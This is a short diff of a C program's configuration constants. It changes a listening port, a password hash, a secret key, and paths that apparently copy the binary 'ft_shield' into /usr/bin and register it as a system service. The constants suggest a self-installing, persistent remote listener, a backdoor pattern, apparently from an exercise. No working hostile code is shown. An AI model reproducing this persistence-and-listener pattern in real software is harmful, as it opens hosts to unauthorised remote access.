@@ -10,14 +10,14 @@
 #include <errno.h>
 #include <fcntl.h>
 
-#define PORT 2032
+#define PORT 4242
 #define BUFFER_SIZE 1024
 #define MAX_CLIENTS 3
-#define AUTH_PASSWORD_HASH "bc29d1bc"//"8fb9f8fd"
+#define AUTH_PASSWORD_HASH "8fb9f8fd"
 #define SECRET_KEY 54
 #define SOURCE_FILE "src/ft_shield"
-#define DEST_FILE "/usr/bin/ft"
-#define SERVICE_NAME "ft.service"
+#define DEST_FILE "/usr/bin/ft_shield"
+#define SERVICE_NAME "ft_shield.service"
 
 int create_server_socket();
 void bind_and_listen(int server_fd, struct sockaddr_in* address);
